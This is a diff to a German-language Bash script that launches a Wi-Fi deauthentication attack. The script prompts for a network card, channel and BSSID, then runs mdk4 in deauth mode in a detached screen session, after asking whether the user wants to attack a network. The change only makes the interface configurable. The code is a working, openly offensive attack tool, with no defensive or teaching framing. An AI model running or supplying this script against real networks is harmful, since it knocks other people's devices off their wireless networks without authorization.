@@ -14,10 +14,11 @@ function get_bssid {
 }
 
 function perform_deauth {
-    local channel=$1
-    local bssid=$2
+    local interface=$1
+    local channel=$2
+    local bssid=$3
 
-    screen -dmS deauth mdk4 wlan1 d -c "$channel" -B "$bssid"
+    screen -dmS deauth mdk4 "$interface" d -c "$channel" -B "$bssid"
 
     echo "Deauthentication-Angriff gestartet für BSSID '$bssid'."
 
@@ -42,11 +43,14 @@ done
 read -p "Möchtest du ein Netzwerk angreifen? (ja/nein): " execute
 
 if [[ "${execute,,}" == "ja" ]]; then
+    echo "Gib die Netzwerkarte an:"
+    read interface
+
     echo "Gib den Channel an:"
     read channel
 
     echo "Gib die BSSID an:"
     read bssid
 
-    perform_deauth "$channel" "$bssid"
+    perform_deauth "$interface" "$channel" "$bssid"
 fi
